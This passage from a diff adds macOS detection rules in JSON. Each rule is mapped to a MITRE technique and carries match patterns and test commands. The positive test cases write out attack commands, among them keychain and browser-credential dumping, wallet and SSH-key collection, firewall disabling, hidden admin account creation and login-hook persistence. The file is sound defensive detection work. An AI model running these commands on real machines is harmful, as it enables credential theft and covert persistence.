+     },
+     {
+      "field": "command",
+      "op": "contains",
+      "pattern": "DisableLibraryValidation"
+     }
+    ]
+   },
+   "tags": [
+    "macos",
+    "amfi"
+   ],
+   "batch": "a2-macos",
+   "tests": {
+    "positive": [
+     {
+      "executable": "/usr/bin/defaults",
+      "command": "defaults write /Library/Preferences/com.apple.security.libraryvalidation.plist DisableLibraryValidation -bool true"
+     }
+    ],
+    "negative": [
+     {
+      "executable": "/usr/bin/defaults",
+      "command": "defaults read /Library/Preferences/com.apple.security.libraryvalidation.plist"
+     }
+    ]
+   }
+  },
+  {
+   "id": "macos-firewall-disabled-socketfilterfw",
+   "name": "Application firewall turned off",
+   "description": "socketfilterfw sets the global state off.",
+   "tactic": "Defense Evasion",
+   "technique": "T1562.004",
+   "technique_name": "Impair Defenses: Disable or Modify System Firewall",
+   "severity": "high",
+   "os": "macos",
+   "event_type": "process",
+   "match": {
+    "all": [
+     {
+      "field": "executable",
+      "op": "suffix",
+      "pattern": "/socketfilterfw"
+     },
+     {
+      "field": "command",
+      "op": "regex",
+      "pattern": "--setglobalstate\\s+(off|0)\\b"
+     }
+    ]
+   },
+   "tags": [
+    "macos",
+    "firewall"
+   ],
+   "batch": "a2-macos",
+   "tests": {
+    "positive": [
+     {
+      "executable": "/usr/libexec/ApplicationFirewall/socketfilterfw",
+      "command": "socketfilterfw --setglobalstate off"
+     }
+    ],
+    "negative": [
+     {
+      "executable": "/usr/libexec/ApplicationFirewall/socketfilterfw",
+      "command": "socketfilterfw --getglobalstate"
+     }
+    ]
+   }
+  },
+  {
+   "id": "macos-pfctl-disable",
+   "name": "pf packet filter disabled",
+   "description": "pfctl -d turns off the packet filter.",
+   "tactic": "Defense Evasion",
+   "technique": "T1562.004",
+   "technique_name": "Impair Defenses: Disable or Modify System Firewall",
+   "severity": "high",
+   "os": "macos",
+   "event_type": "process",
+   "match": {
+    "all": [
+     {
+      "field": "executable",
+      "op": "suffix",
+      "pattern": "/pfctl"
+     },
+     {
+      "field": "command",
+      "op": "regex",
+      "pattern": "\\s-d\\b|\\s-F\\s+all"
+     }
+    ]
+   },
+   "tags": [
+    "macos",
+    "firewall"
+   ],
+   "batch": "a2-macos",
+   "tests": {
+    "positive": [
+     {
+      "executable": "/sbin/pfctl",
+      "command": "pfctl -d"
+     }
+    ],
+    "negative": [
+     {
+      "executable": "/sbin/pfctl",
+      "command": "pfctl -s rules"
+     }
+    ]
+   }
+  },
+  {
+   "id": "macos-security-dump-keychain",
+   "name": "security dump-keychain",
+   "description": "security dump-keychain extracts entries, optionally with secrets.",
+   "tactic": "Credential Access",
+   "technique": "T1555.001",
+   "technique_name": "Credentials from Password Stores: Keychain",
+   "severity": "high",
+   "os": "macos",
+   "event_type": "process",
+   "match": {
+    "all": [
+     {
+      "field": "executable",
+      "op": "suffix",
+      "pattern": "/security"
+     },
+     {
+      "field": "command",
+      "op": "contains",
+      "pattern": "dump-keychain"
+     }
+    ]
+   },
+   "tags": [
+    "macos",
+    "keychain"
+   ],
+   "batch": "a2-macos",
+   "tests": {
+    "positive": [
+     {
+      "executable": "/usr/bin/security",
+      "command": "security dump-keychain -d login.keychain"
+     }
+    ],
+    "negative": [
+     {
+      "executable": "/usr/bin/security",
+      "command": "security list-keychains"
+     }
+    ]
+   }
+  },
+  {
+   "id": "macos-security-find-password-secret",
+   "name": "security prints a stored secret",
+   "description": "find-generic-password or find-internet-password with -w or -g reveals the secret to stdout.",
+   "tactic": "Credential Access",
+   "technique": "T1555.001",
+   "technique_name": "Credentials from Password Stores: Keychain",
+   "severity": "high",
+   "os": "macos",
+   "event_type": "process",
+   "match": {
+    "all": [
+     {
+      "field": "executable",
+      "op": "suffix",
+      "pattern": "/security"
+     },
+     {
+      "field": "command",
+      "op": "regex",
+      "pattern": "find-(generic|internet)-password"
+     },
+     {
+      "field": "command",
+      "op": "regex",
+      "pattern": "\\s-[a-z]*[wg][a-z]*\\b"
+     }
+    ]
+   },
+   "tags": [
+    "macos",
+    "keychain"
+   ],
+   "batch": "a2-macos",
+   "tests": {
+    "positive": [
+     {
+      "executable": "/usr/bin/security",
+      "command": "security find-generic-password -ga Chrome"
+     }
+    ],
+    "negative": [
+     {
+      "executable": "/usr/bin/security",
+      "command": "security find-generic-password -s foo"
+     }
+    ]
+   }
+  },
+  {
+   "id": "macos-security-browser-safe-storage",
+   "name": "Browser Safe Storage keychain item requested",
+   "description": "security queries the Chrome/Brave/Edge Safe Storage key used to decrypt browser stores.",
+   "tactic": "Credential Access",
+   "technique": "T1555.003",
+   "technique_name": "Credentials from Password Stores: Credentials from Web Browsers",
+   "severity": "high",
+   "os": "macos",
+   "event_type": "process",
+   "match": {
+    "all": [
+     {
+      "field": "executable",
+      "op": "suffix",
+      "pattern": "/security"
+     },
+     {
+      "field": "command",
+      "op": "contains",
+      "pattern": "safe storage"
+     }
+    ]
+   },
+   "tags": [
+    "macos",
+    "keychain",
+    "browser"
+   ],
+   "batch": "a2-macos",
+   "tests": {
+    "positive": [
+     {
+      "executable": "/usr/bin/security",
+      "command": "security find-generic-password -wa \"Chrome Safe Storage\""
+     }
+    ],
+    "negative": [
+     {
+      "executable": "/usr/bin/security",
+      "command": "security find-generic-password -s myapp"
+     }
+    ]
+   }
+  },
+  {
+   "id": "macos-security-unlock-keychain-password",
+   "name": "Keychain unlocked with a password argument",
+   "description": "security unlock-keychain -p places the password on the command line, typical of scripted theft.",
+   "tactic": "Credential Access",
+   "technique": "T1555.001",
+   "technique_name": "Credentials from Password Stores: Keychain",
+   "severity": "medium",
+   "os": "macos",
+   "event_type": "process",
+   "match": {
+    "all": [
+     {
+      "field": "executable",
+      "op": "suffix",
+      "pattern": "/security"
+     },
+     {
+      "field": "command",
+      "op": "contains",
+      "pattern": "unlock-keychain"
+     },
+     {
+      "field": "command",
+      "op": "regex",
+      "pattern": "\\s-p\\s"
+     },
+     {
+      "not": {
+       "field": "command",
+       "op": "regex",
+       "pattern": "[^\\s/]*(build|ci|runner|temp|tmp|signing|release)[^\\s/]*\\.keychain"
+      }
+     }
+    ]
+   },
+   "tags": [
+    "macos",
+    "keychain"
+   ],
+   "batch": "a2-macos",
+   "tests": {
+    "positive": [
+     {
+      "executable": "/usr/bin/security",
+      "command": "security unlock-keychain -p hunter2 login.keychain"
+     }
+    ],
+    "negative": [
+     {
+      "executable": "/usr/bin/security",
+      "command": "security lock-keychain login.keychain"
+     }
+    ]
+   }
+  },
+  {
+   "id": "macos-security-trusted-cert-add",
+   "name": "Root certificate trusted via security",
+   "description": "security add-trusted-cert installs a CA into trust settings, enabling TLS interception.",
+   "tactic": "Defense Evasion",
+   "technique": "T1553.004",
+   "technique_name": "Subvert Trust Controls: Install Root Certificate",
+   "severity": "high",
+   "os": "macos",
+   "event_type": "process",
+   "match": {
+    "all": [
+     {
+      "field": "executable",
+      "op": "suffix",
+      "pattern": "/security"
+     },
+     {
+      "field": "command",
+      "op": "contains",
+      "pattern": "add-trusted-cert"
+     }
+    ]
+   },
+   "tags": [
+    "macos",
+    "cert"
+   ],
+   "batch": "a2-macos",
+   "tests": {
+    "positive": [
+     {
+      "executable": "/usr/bin/security",
+      "command": "security add-trusted-cert -d -r trustRoot -k /Library/Keychains/System.keychain ca.pem"
+     }
+    ],
+    "negative": [
+     {
+      "executable": "/usr/bin/security",
+      "command": "security verify-cert -c ca.pem"
+     }
+    ]
+   }
+  },
+  {
+   "id": "macos-kcpassword-access",
+   "name": "kcpassword read or copied",
+   "description": "The auto-login password file is referenced by a command that reads or copies it.",
+   "tactic": "Credential Access",
+   "technique": "T1552.001",
+   "technique_name": "Unsecured Credentials: Credentials In Files",
+   "severity": "high",
+   "os": "macos",
+   "event_type": "process",
+   "match": {
+    "all": [
+     {
+      "field": "command",
+      "op": "contains",
+      "pattern": "kcpassword"
+     },
+     {
+      "field": "command",
+      "op": "regex",
+      "pattern": "\\b(cat|cp|xxd|base64|strings|hexdump|ditto)\\b"
+     }
+    ]
+   },
+   "tags": [
+    "macos",
+    "credentials"
+   ],
+   "batch": "a2-macos",
+   "tests": {
+    "positive": [
+     {
+      "executable": "/bin/cat",
+      "command": "cat /etc/kcpassword"
+     }
+    ],
+    "negative": [
+     {
+      "executable": "/bin/ls",
+      "command": "ls /etc/kcpassword"
+     }
+    ]
+   }
+  },
+  {
+   "id": "macos-keychain-file-copy",
+   "name": "Keychain database copied by command",
+   "description": "A shell command copies or archives a user Keychains file.",
+   "tactic": "Credential Access",
+   "technique": "T1555.001",
+   "technique_name": "Credentials from Password Stores: Keychain",
+   "severity": "high",
+   "os": "macos",
+   "event_type": "process",
+   "match": {
+    "all": [
+     {
+      "field": "command",
+      "op": "contains",
+      "pattern": "library/keychains"
+     },
+     {
+      "field": "command",
+      "op": "regex",
+      "pattern": "\\b(cp|ditto|scp|zip|tar|rsync|base64)\\b"
+     }
+    ]
+   },
+   "tags": [
+    "macos",
+    "keychain"
+   ],
+   "batch": "a2-macos",
+   "tests": {
+    "positive": [
+     {
+      "executable": "/bin/cp",
+      "command": "cp ~/Library/Keychains/login.keychain-db /tmp/l.db"
+     }
+    ],
+    "negative": [
+     {
+      "executable": "/bin/ls",
+      "command": "ls ~/Library/Keychains"
+     }
+    ]
+   }
+  },
+  {
+   "id": "macos-browser-db-sqlite-read",
+   "name": "sqlite3 opens a browser credential or cookie store",
+   "description": "sqlite3 reads Chrome Login Data/Cookies, Firefox cookies.sqlite or logins.",
+   "tactic": "Credential Access",
+   "technique": "T1555.003",
+   "technique_name": "Credentials from Password Stores: Credentials from Web Browsers",
+   "severity": "high",
+   "os": "macos",
+   "event_type": "process",
+   "match": {
+    "all": [
+     {
+      "field": "executable",
+      "op": "suffix",
+      "pattern": "/sqlite3"
+     },
+     {
+      "field": "command",
+      "op": "contains",
+      "patterns": [
+       "login data",
+       "/cookies",
+       "cookies.sqlite",
+       "logins.json",
+       "web data",
+       "key4.db"
+      ]
+     }
+    ]
+   },
+   "tags": [
+    "macos",
+    "browser"
+   ],
+   "batch": "a2-macos",
+   "tests": {
+    "positive": [
+     {
+      "executable": "/usr/bin/sqlite3",
+      "command": "sqlite3 \"/Users/a/Library/Application Support/Google/Chrome/Default/Login Data\" \"select * from logins\""
+     }
+    ],
+    "negative": [
+     {
+      "executable": "/usr/bin/sqlite3",
+      "command": "sqlite3 app.db .tables"
+     }
+    ]
+   }
+  },
+  {
+   "id": "macos-browser-store-copy",
+   "name": "Browser profile files copied by command",
+   "description": "cp/zip/tar of Chrome, Firefox, Brave or Safari credential and cookie stores.",
+   "tactic": "Credential Access",
+   "technique": "T1555.003",
+   "technique_name": "Credentials from Password Stores: Credentials from Web Browsers",
+   "severity": "high",
+   "os": "macos",
+   "event_type": "process",
+   "match": {
+    "all": [
+     {
+      "field": "command",
+      "op": "contains",
+      "patterns": [
+       "login data",
+       "cookies.sqlite",
+       "key4.db",
+       "logins.json",
+       "binarycookies"
+      ]
+     },
+     {
+      "field": "command",
+      "op": "regex",
+      "pattern": "\\b(cp|ditto|zip|tar|scp|curl)\\b"
+     }
+    ]
+   },
+   "tags": [
+    "macos",
+    "browser"
+   ],
+   "batch": "a2-macos",
+   "tests": {
+    "positive": [
+     {
+      "executable": "/bin/cp",
+      "command": "cp \"Library/Application Support/Google/Chrome/Default/Login Data\" /tmp/ld"
+     }
+    ],
+    "negative": [
+     {
+      "executable": "/bin/cp",
+      "command": "cp report.pdf /tmp/"
+     }
+    ]
+   }
+  },
+  {
+   "id": "macos-crypto-wallet-data-copy",
+   "name": "Crypto wallet data collected",
+   "description": "Commands that archive or copy known desktop wallet or browser-wallet extension directories.",
+   "tactic": "Collection",
+   "technique": "T1005",
+   "technique_name": "Data from Local System",
+   "severity": "high",
+   "os": "macos",
+   "event_type": "process",
+   "match": {
+    "all": [
+     {
+      "field": "command",
+      "op": "contains",
+      "patterns": [
+       "exodus/exodus.wallet",
+       "exodus.wallet",
+       "electrum/wallets",
+       "bitcoin/wallet.dat",
+       "atomic/local storage",
+       "nkbihfbeogaeaoehlefnkodbefgpgknn"
+      ]
+     },
+     {
+      "field": "command",
+      "op": "regex",
+      "pattern": "\\b(cp|ditto|zip|tar|scp|curl|rsync)\\b"
+     }
+    ]
+   },
+   "tags": [
+    "macos",
+    "wallet"
+   ],
+   "batch": "a2-macos",
+   "tests": {
+    "positive": [
+     {
+      "executable": "/usr/bin/zip",
+      "command": "zip -r /tmp/w.zip Library/Application Support/Exodus/exodus.wallet"
+     }
+    ],
+    "negative": [
+     {
+      "executable": "/usr/bin/zip",
+      "command": "zip -r /tmp/notes.zip Documents"
+     }
+    ]
+   }
+  },
+  {
+   "id": "macos-ssh-private-key-sweep",
+   "name": "SSH private keys read in bulk",
+   "description": "A command globbing id_* or searching for private keys to archive or print.",
+   "tactic": "Credential Access",
+   "technique": "T1552.004",
+   "technique_name": "Unsecured Credentials: Private Keys",
+   "severity": "medium",
+   "os": "macos",
+   "event_type": "process",
+   "match": {
+    "any": [
+     {
+      "field": "command",
+      "op": "regex",
+      "pattern": "\\b(cat|cp|tar|zip|scp)\\b.*\\.ssh/id_"
+     },
+     {
+      "field": "command",
+      "op": "regex",
+      "pattern": "find\\s.*-name\\s+['\\\"]?id_(rsa|ed25519|ecdsa)"
+     }
+    ]
+   },
+   "tags": [
+    "macos",
+    "ssh"
+   ],
+   "batch": "a2-macos",
+   "tests": {
+    "positive": [
+     {
+      "executable": "/bin/cat",
+      "command": "cat /Users/a/.ssh/id_rsa"
+     },
+     {
+      "executable": "/usr/bin/find",
+      "command": "find / -name id_rsa"
+     }
+    ],
+    "negative": [
+     {
+      "executable": "/bin/cat",
+      "command": "cat /Users/a/.ssh/config"
+     }
+    ]
+   }
+  },
+  {
+   "id": "macos-cloud-creds-read-cmd",
+   "name": "Cloud credential files read by command",
+   "description": "A shell command prints or archives AWS, gcloud, Azure or kube credential files.",
+   "tactic": "Credential Access",
+   "technique": "T1552.001",
+   "technique_name": "Unsecured Credentials: Credentials In Files",
+   "severity": "medium",
+   "os": "macos",
+   "event_type": "process",
+   "match": {
+    "all": [
+     {
+      "field": "command",
+      "op": "contains",
+      "patterns": [
+       ".aws/credentials",
+       ".config/gcloud/credentials.db",
+       ".azure/accesstokens.json",
+       ".kube/config",
+       "application_default_credentials.json"
+      ]
+     },
+     {
+      "field": "command",
+      "op": "regex",
+      "pattern": "\\b(cat|cp|tar|zip|scp|curl|base64|ditto)\\b"
+     }
+    ]
+   },
+   "tags": [
+    "macos",
+    "cloud"
+   ],
+   "batch": "a2-macos",
+   "tests": {
+    "positive": [
+     {
+      "executable": "/bin/cat",
+      "command": "cat ~/.aws/credentials"
+     }
+    ],
+    "negative": [
+     {
+      "executable": "/usr/local/bin/aws",
+      "command": "aws sts get-caller-identity"
+     }
+    ]
+   }
+  },
+  {
+   "id": "macos-dscl-create-user",
+   "name": "Local user created with dscl",
+   "description": "dscl . -create /Users/... builds a local account directly in the directory service.",
+   "tactic": "Persistence",
+   "technique": "T1136.001",
+   "technique_name": "Create Account: Local Account",
+   "severity": "high",
+   "os": "macos",
+   "event_type": "process",
+   "match": {
+    "all": [
+     {
+      "field": "executable",
+      "op": "suffix",
+      "pattern": "/dscl"
+     },
+     {
+      "field": "command",
+      "op": "regex",
+      "pattern": "-create\\s+/users/"
+     }
+    ]
+   },
+   "tags": [
+    "macos",
+    "account"
+   ],
+   "batch": "a2-macos",
+   "tests": {
+    "positive": [
+     {
+      "executable": "/usr/bin/dscl",
+      "command": "dscl . -create /Users/support UserShell /bin/zsh"
+     }
+    ],
+    "negative": [
+     {
+      "executable": "/usr/bin/dscl",
+      "command": "dscl . -read /Users/ann"
+     }
+    ]
+   }
+  },
+  {
+   "id": "macos-sysadminctl-add-user",
+   "name": "sysadminctl adds a user",
+   "description": "sysadminctl -addUser creates a local account, optionally as an admin.",
+   "tactic": "Persistence",
+   "technique": "T1136.001",
+   "technique_name": "Create Account: Local Account",
+   "severity": "high",
+   "os": "macos",
+   "event_type": "process",
+   "match": {
+    "all": [
+     {
+      "field": "executable",
+      "op": "suffix",
+      "pattern": "/sysadminctl"
+     },
+     {
+      "field": "command",
+      "op": "contains",
+      "pattern": "-adduser"
+     }
+    ]
+   },
+   "tags": [
+    "macos",
+    "account"
+   ],
+   "batch": "a2-macos",
+   "tests": {
+    "positive": [
+     {
+      "executable": "/usr/sbin/sysadminctl",
+      "command": "sysadminctl -addUser tmp -password x -admin"
+     }
+    ],
+    "negative": [
+     {
+      "executable": "/usr/sbin/sysadminctl",
+      "command": "sysadminctl -secureTokenStatus ann"
+     }
+    ]
+   }
+  },
+  {
+   "id": "macos-admin-group-membership-add",
+   "name": "User added to the admin group",
+   "description": "dscl or dseditgroup adds a member to the admin group.",
+   "tactic": "Privilege Escalation",
+   "technique": "T1098",
+   "technique_name": "Account Manipulation",
+   "severity": "high",
+   "os": "macos",
+   "event_type": "process",
+   "match": {
+    "any": [
+     {
+      "all": [
+       {
+        "field": "executable",
+        "op": "suffix",
+        "pattern": "/dscl"
+       },
+       {
+        "field": "command",
+        "op": "regex",
+        "pattern": "-(append|merge)\\s+/groups/admin\\s+groupmembership"
+       }
+      ]
+     },
+     {
+      "all": [
+       {
+        "field": "executable",
+        "op": "suffix",
+        "pattern": "/dseditgroup"
+       },
+       {
+        "field": "command",
+        "op": "regex",
+        "pattern": "-a\\s+\\S+.*\\badmin\\b"
+       },
+       {
+        "field": "command",
+        "op": "contains",
+        "pattern": "edit"
+       }
+      ]
+     }
+    ]
+   },
+   "tags": [
+    "macos",
+    "account"
+   ],
+   "batch": "a2-macos",
+   "tests": {
+    "positive": [
+     {
+      "executable": "/usr/bin/dscl",
+      "command": "dscl . -append /Groups/admin GroupMembership support"
+     },
+     {
+      "executable": "/usr/sbin/dseditgroup",
+      "command": "dseditgroup -o edit -a support -t user admin"
+     }
+    ],
+    "negative": [
+     {
+      "executable": "/usr/bin/dscl",
+      "command": "dscl . -read /Groups/admin"
+     },
+     {
+      "executable": "/usr/sbin/dseditgroup",
+      "command": "dseditgroup -o checkmember -m ann admin"
+     }
+    ]
+   }
+  },
+  {
+   "id": "macos-hidden-account-dscl",
+   "name": "Account hidden from login window",
+   "description": "dscl sets IsHidden, or defaults hides sub-500 users, concealing an account.",
+   "tactic": "Defense Evasion",
+   "technique": "T1564.002",
+   "technique_name": "Hide Artifacts: Hidden Users",
+   "severity": "high",
+   "os": "macos",
+   "event_type": "process",
+   "match": {
+    "any": [
+     {
+      "all": [
+       {
+        "field": "executable",
+        "op": "suffix",
+        "pattern": "/dscl"
+       },
+       {
+        "field": "command",
+        "op": "regex",
+        "pattern": "ishidden\\s+(1|yes)"
+       }
+      ]
+     },
+     {
+      "all": [
+       {
+        "field": "command",
+        "op": "contains",
+        "pattern": "defaults write"
+       },
+       {
+        "field": "command",
+        "op": "contains",
+        "pattern": "hide500users"
+       }
+      ]
+     }
+    ]
+   },
+   "tags": [
+    "macos",
+    "account",
+    "hiding"
+   ],
+   "batch": "a2-macos",
+   "tests": {
+    "positive": [
+     {
+      "executable": "/usr/bin/dscl",
+      "command": "dscl . -create /Users/support IsHidden 1"
+     }
+    ],
+    "negative": [
+     {
+      "executable": "/usr/bin/dscl",
+      "command": "dscl . -read /Users/support IsHidden"
+     }
+    ]
+   }
+  },
+  {
+   "id": "macos-dscl-password-change",
+   "name": "Account password set via dscl or sysadminctl",
+   "description": "dscl -passwd or sysadminctl -resetPasswordFor changes credentials of a local account.",
+   "tactic": "Persistence",
+   "technique": "T1098",
+   "technique_name": "Account Manipulation",
+   "severity": "medium",
+   "os": "macos",
+   "event_type": "process",
+   "match": {
+    "any": [
+     {
+      "all": [
+       {
+        "field": "executable",
+        "op": "suffix",
+        "pattern": "/dscl"
+       },
+       {
+        "field": "command",
+        "op": "regex",
+        "pattern": "\\s-passwd\\s"
+       }
+      ]
+     },
+     {
+      "all": [
+       {
+        "field": "executable",
+        "op": "suffix",
+        "pattern": "/sysadminctl"
+       },
+       {
+        "field": "command",
+        "op": "contains",
+        "pattern": "-resetpasswordfor"
+       }
+      ]
+     }
+    ]
+   },
+   "tags": [
+    "macos",
+    "account"
+   ],
+   "batch": "a2-macos",
+   "tests": {
+    "positive": [
+     {
+      "executable": "/usr/bin/dscl",
+      "command": "dscl . -passwd /Users/ann newpass"
+     }
+    ],
+    "negative": [
+     {
+      "executable": "/usr/bin/dscl",
+      "command": "dscl . -list /Users"
+     }
+    ]
+   }
+  },
+  {
+   "id": "macos-dscl-authonly-guess",
+   "name": "dscl -authonly password check",
+   "description": "dscl -authonly tests a password against a local account, used for brute force or validating phished credentials.",
+   "tactic": "Credential Access",
+   "technique": "T1110.001",
+   "technique_name": "Brute Force: Password Guessing",
+   "severity": "medium",
+   "os": "macos",
+   "event_type": "process",
+   "match": {
+    "all": [
+     {
+      "field": "executable",
+      "op": "suffix",
+      "pattern": "/dscl"
+     },
+     {
+      "field": "command",
+      "op": "contains",
+      "pattern": "-authonly"
+     }
+    ]
+   },
+   "tags": [
+    "macos",
+    "account"
+   ],
+   "batch": "a2-macos",
+   "tests": {
+    "positive": [
+     {
+      "executable": "/usr/bin/dscl",
+      "command": "dscl /Local/Default -authonly ann hunter2"
+     }
+    ],
+    "negative": [
+     {
+      "executable": "/usr/bin/dscl",
+      "command": "dscl . -list /Users"
+     }
+    ]
+   }
+  },
+  {
+   "id": "macos-sudo-stdin-password",
+   "name": "sudo -S with a piped password",
+   "description": "A password is piped into sudo -S, used by scripts that already phished the password.",
+   "tactic": "Privilege Escalation",
+   "technique": "T1548.003",
+   "technique_name": "Abuse Elevation Control Mechanism: Sudo and Sudo Caching",
+   "severity": "medium",
+   "os": "macos",
+   "event_type": "process",
+   "match": {
+    "field": "command",
+    "op": "regex",
+    "pattern": "(echo|printf)\\s+.*\\|\\s*sudo\\s+-[a-z]*s\\b"
+   },
+   "tags": [
+    "macos",
+    "sudo"
+   ],
+   "batch": "a2-macos",
+   "tests": {
+    "positive": [
+     {
+      "executable": "/bin/bash",
+      "command": "bash -c 'echo hunter2 | sudo -S id'"
+     }
+    ],
+    "negative": [
+     {
+      "executable": "/usr/bin/sudo",
+      "command": "sudo -l"
+     },
+     {
+      "executable": "/bin/bash",
+      "command": "bash -c 'echo hi | sort'"
+     }
+    ]
+   }
+  },
+  {
+   "id": "macos-remote-login-enabled",
+   "name": "SSH remote login enabled",
+   "description": "systemsetup turns Remote Login on.",
+   "tactic": "Persistence",
+   "technique": "T1021.004",
+   "technique_name": "Remote Services: SSH",
+   "severity": "medium",
+   "os": "macos",
+   "event_type": "process",
+   "match": {
+    "all": [
+     {
+      "field": "executable",
+      "op": "suffix",
+      "pattern": "/systemsetup"
+     },
+     {
+      "field": "command",
+      "op": "regex",
+      "pattern": "-setremotelogin\\s+on\\b"
+     }
+    ]
+   },
+   "tags": [
+    "macos",
+    "ssh"
+   ],
+   "batch": "a2-macos",
+   "tests": {
+    "positive": [
+     {
+      "executable": "/usr/sbin/systemsetup",
+      "command": "systemsetup -setremotelogin on"
+     }
+    ],
+    "negative": [
+     {
+      "executable": "/usr/sbin/systemsetup",
+      "command": "systemsetup -getremotelogin"
+     }
+    ]
+   }
+  },
+  {
+   "id": "macos-ard-kickstart-enable",
+   "name": "Remote Management activated via kickstart",
+   "description": "ARD kickstart enables Remote Management with privileges, a screen-control backdoor.",
+   "tactic": "Lateral Movement",
+   "technique": "T1021.005",
+   "technique_name": "Remote Services: VNC",
+   "severity": "high",
+   "os": "macos",
+   "event_type": "process",
+   "match": {
+    "all": [
+     {
+      "field": "executable",
+      "op": "suffix",
+      "pattern": "/kickstart"
+     },
+     {
+      "field": "command",
+      "op": "contains",
+      "pattern": "-activate"
+     }
+    ]
+   },
+   "tags": [
+    "macos",
+    "ard"
+   ],
+   "batch": "a2-macos",
+   "tests": {
+    "positive": [
+     {
+      "executable": "/System/Library/CoreServices/RemoteManagement/ARDAgent.app/Contents/Resources/kickstart",
+      "command": "kickstart -activate -configure -access -on -privs -all"
+     }
+    ],
+    "negative": [
+     {
+      "executable": "/System/Library/CoreServices/RemoteManagement/ARDAgent.app/Contents/Resources/kickstart",
+      "command": "kickstart -deactivate -stop"
+     }
+    ]
+   }
+  },
+  {
+   "id": "macos-defaults-loginhook",
+   "name": "Login or logout hook configured",
+   "description": "defaults sets LoginHook or LogoutHook so a script runs as root at login.",
+   "tactic": "Persistence",
+   "technique": "T1037.002",
+   "technique_name": "Boot or Logon Initialization Scripts: Logon Script (Mac)",
+   "severity": "high",
+   "os": "macos",
+   "event_type": "process",
+   "match": {
+    "all": [
+     {
+      "field": "command",
+      "op": "contains",
+      "pattern": "defaults write"
+     },
+     {
+      "field": "command",
+      "op": "contains",
+      "patterns": [
+       "loginhook",
+       "logouthook"
+      ]
+     }
+    ]
+   },
+   "tags": [
+    "macos",
+    "login"
+   ],
+   "batch": "a2-macos",
+   "tests": {
+    "positive": [
+     {
+      "executable": "/usr/bin/defaults",
+      "command": "defaults write com.apple.loginwindow LoginHook /tmp/h.sh"
+     }
+    ],
+    "negative": [
+     {
+      "executable": "/usr/bin/defaults",
+      "command": "defaults read com.apple.loginwindow"
+     }
+    ]
+   }
+  },
+  {
+   "id": "macos-defaults-disable-screensaver-lock",
+   "name": "Screen lock password requirement disabled",
+   "description": "defaults turns off askForPassword for the screensaver.",
+   "tactic": "Defense Evasion",
+   "technique": "T1562.001",
+   "technique_name": "Impair Defenses: Disable or Modify Tools",
+   "severity": "low",
+   "os": "macos",
+   "event_type": "process",
+   "match": {
+    "all": [
+     {
+      "field": "command",
+      "op": "contains",
+      "pattern": "defaults write"
+     },
+     {
+      "field": "command",
+      "op": "regex",
+      "pattern": "askforpassword\\s+(-int\\s+|-bool\\s+)?(0|false|no)\\b"
+     }
+    ]
+   },
+   "tags": [
+    "macos",
+    "lock"
+   ],
+   "batch": "a2-macos",
+   "tests": {
+    "positive": [
+     {
+      "executable": "/usr/bin/defaults",
+      "command": "defaults write com.apple.screensaver askForPassword -int 0"
+     }
+    ],
+    "negative": [
+     {
+      "executable": "/usr/bin/defaults",
+      "command": "defaults write com.apple.screensaver askForPassword -int 1"
+     }
+    ]
+   }
+  },
+  {
+   "id": "macos-defaults-disable-xprotect-update",
+   "name": "Security update settings disabled via defaults",
+   "description": "defaults write turns off automatic XProtect/config data updates.",
+   "tactic": "Defense Evasion",
+   "technique": "T1562.001",
+   "technique_name": "Impair Defenses: Disable or Modify Tools",
+   "severity": "medium",
+   "os": "macos",
+   "event_type": "process",
+   "match": {
+    "all": [
+     {
+      "field": "command",
+      "op": "contains",
+      "pattern": "defaults write"
+     },
+     {
+      "field": "command",
+      "op": "contains",
+      "patterns": [
+       "configdatainstall",
+       "criticalupdateinstall"
+      ]
+     },
+     {
+      "field": "command",
+      "op": "regex",
+      "pattern": "(-bool\\s+(false|no)|-int\\s+0)"
+     }
+    ]
+   },
+   "tags": [
+    "macos",
+    "updates"
+   ],
+   "batch": "a2-macos",
+   "tests": {
+    "positive": [
+     {
+      "executable": "/usr/bin/defaults",
+      "command": "defaults write /Library/Preferences/com.apple.SoftwareUpdate ConfigDataInstall -bool false"
+     }
+    ],
+    "negative": [
+     {
+      "executable": "/usr/bin/defaults",
+      "command": "defaults write /Library/Preferences/com.apple.SoftwareUpdate ConfigDataInstall -bool true"
+     }
+    ]
+   }
+  },
+  {
+   "id": "macos-profiles-install-local",
+   "name": "Configuration profile installed from the command line",
+   "description": "profiles install loads a mobileconfig which can install trust anchors, proxies or restrictions.",
+   "tactic": "Defense Evasion",
+   "technique": "T1553",
+   "technique_name": "Subvert Trust Controls",
+   "severity": "medium",
+   "os": "macos",
+   "event_type": "process",
+   "match": {
+    "all": [
+     {
+      "field": "executable",
+      "op": "suffix",
+      "pattern": "/profiles"
+     },
+     {
+      "field": "command",
+      "op": "regex",
+      "pattern": "\\binstall\\b|\\s-i\\b"
+     },
+     {
+      "field": "command",
+      "op": "contains",
+      "pattern": ".mobileconfig"
+     }
+    ]
+   },
+   "tags": [
+    "macos",
+    "profile"
+   ],
+   "batch": "a2-macos",
+   "tests": {
+    "positive": [
+     {
+      "executable": "/usr/bin/profiles",
+      "command": "profiles install -type configuration -path /tmp/x.mobileconfig"
+     }
+    ],
+    "negative": [
+     {
+      "executable": "/usr/bin/profiles",
+      "command": "profiles list"
+     },
+     {
+      "executable": "/usr/bin/profiles",
+      "command": "profiles status -type enrollment"
+     }
+    ]
+   }
+  },
+  {
+   "id": "macos-plistbuddy-launchd-keys",
+   "name": "PlistBuddy building a launchd job",
+   "description": "PlistBuddy adds RunAtLoad or ProgramArguments keys, constructing a launchd persistence plist.",
+   "tactic": "Persistence",
+   "technique": "T1543.001",
+   "technique_name": "Create or Modify System Process: Launch Agent",
+   "severity": "medium",
+   "os": "macos",
+   "event_type": "process",
+   "match": {
+    "all": [
+     {
+      "field": "executable",
+      "op": "suffix",
+      "pattern": "/plistbuddy"
+     },
+     {
+      "field": "command",
+      "op": "contains",
+      "patterns": [
+       ":runatload",
+       ":programarguments",
+       ":keepalive"
+      ]
+     },
+     {
+      "field": "command",
+      "op": "contains",
+      "pattern": "add"
+     }
+    ]
+   },
+   "tags": [
+    "macos",
+    "launchd"
+   ],
+   "batch": "a2-macos",
+   "tests": {
+    "positive": [
+     {
+      "executable": "/usr/libexec/PlistBuddy",
+      "command": "PlistBuddy -c \"Add :RunAtLoad bool true\" /tmp/a.plist"
+     }
+    ],
+    "negative": [
+     {
+      "executable": "/usr/libexec/PlistBuddy",
+      "command": "PlistBuddy -c \"Print :CFBundleName\" Info.plist"
+     }
+    ]
+   }
+  },
+  {
+   "id": "macos-plist-copied-to-launchd",
+   "name": "plist copied into a LaunchAgents or LaunchDaemons directory",
+   "description": "cp/mv/ditto/install of a plist into a launchd directory from the shell.",
